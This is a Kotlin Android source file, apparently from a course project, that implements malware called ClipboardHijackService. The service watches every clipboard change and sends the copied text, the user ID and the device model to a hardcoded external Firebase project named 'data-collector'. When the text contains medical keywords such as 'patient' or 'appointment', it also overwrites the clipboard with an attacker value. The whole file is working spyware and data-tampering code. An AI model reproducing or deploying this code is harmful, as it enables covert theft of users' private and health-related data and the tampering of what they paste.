package com.example.inf2007_mad_j1847.malware

import android.app.Service
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.util.Log
import com.google.firebase.FirebaseApp
import com.google.firebase.FirebaseOptions
import com.google.firebase.Timestamp
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore

class ClipboardHijackService : Service() {

    private val TAG = "ClipboardHijack"
    private lateinit var clipboardManager: ClipboardManager
    private lateinit var db: FirebaseFirestore
    private val auth = FirebaseAuth.getInstance()
    private var isInjecting = false
    private var lastCapturedText = ""

    private val ATTACKER_VALUE = "ATTACKER_INJECTED_VALUE_12345"

    private val SENSITIVE_KEYWORDS = listOf(
        "appointment", "doctor", "hospital", "patient", "booking"
    )

    private fun initSecondaryFirebase(): FirebaseFirestore {
        val existingApp = FirebaseApp.getApps(this).find { it.name == "data-collector" }
        if (existingApp != null) {
            return FirebaseFirestore.getInstance(existingApp)
        }

        val options = FirebaseOptions.Builder()
            .setApplicationId("1:882225071277:android:954a042cc304fa71557224")
            .setApiKey("AIzaSyD0dGLQpQn-326ta_XfE8br9i9UehK0e20")
            .setProjectId("data-collector-cd857")
            .build()

        val secondaryApp = FirebaseApp.initializeApp(this, options, "data-collector")
        return FirebaseFirestore.getInstance(secondaryApp)
    }

    private val clipboardListener = ClipboardManager.OnPrimaryClipChangedListener {
        // ignore if we triggered this ourselves
        if (isInjecting) return@OnPrimaryClipChangedListener

        val clip = clipboardManager.primaryClip ?: return@OnPrimaryClipChangedListener
        val copiedText = clip.getItemAt(0)?.text?.toString() ?: return@OnPrimaryClipChangedListener

        // ignore if same text as last capture (debounce)
        if (copiedText == lastCapturedText) return@OnPrimaryClipChangedListener
        lastCapturedText = copiedText

        Log.d(TAG, "Clipboard captured: $copiedText")

        val isSensitive = SENSITIVE_KEYWORDS.any {
            copiedText.contains(it, ignoreCase = true)
        }

        // single write to firestore
        exfiltrateToFirestore(copiedText, isSensitive)

        if (isSensitive) {
            Log.d(TAG, "SENSITIVE data detected! Replacing clipboard.")
            injectClipboard(ATTACKER_VALUE)
        }
    }

    override fun onCreate() {
        super.onCreate()
        clipboardManager = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        db = initSecondaryFirebase()
        clipboardManager.addPrimaryClipChangedListener(clipboardListener)
        Log.d(TAG, "ClipboardHijackService started")
    }

    override fun onDestroy() {
        super.onDestroy()
        clipboardManager.removePrimaryClipChangedListener(clipboardListener)
    }

    private fun injectClipboard(value: String) {
        isInjecting = true
        val clip = ClipData.newPlainText("injected", value)
        clipboardManager.setPrimaryClip(clip)
        isInjecting = false
        Log.d(TAG, "Clipboard replaced with: $value")
    }

    private fun exfiltrateToFirestore(capturedText: String, isSensitive: Boolean) {
        val uid = auth.currentUser?.uid ?: "unknown_user"

        val data = hashMapOf(
            "uid" to uid,
            "capturedText" to capturedText,
            "isSensitive" to isSensitive,
            "replacedWith" to if (isSensitive) ATTACKER_VALUE else null,
            "timestamp" to Timestamp.now(),
            "deviceInfo" to android.os.Build.MODEL
        )

        db.collection("hijacked_clipboard")
            .add(data)
            .addOnSuccessListener {
                Log.d(TAG, "Exfiltrated to data-collector: $capturedText")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "Failed: ${e.message}")
            }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}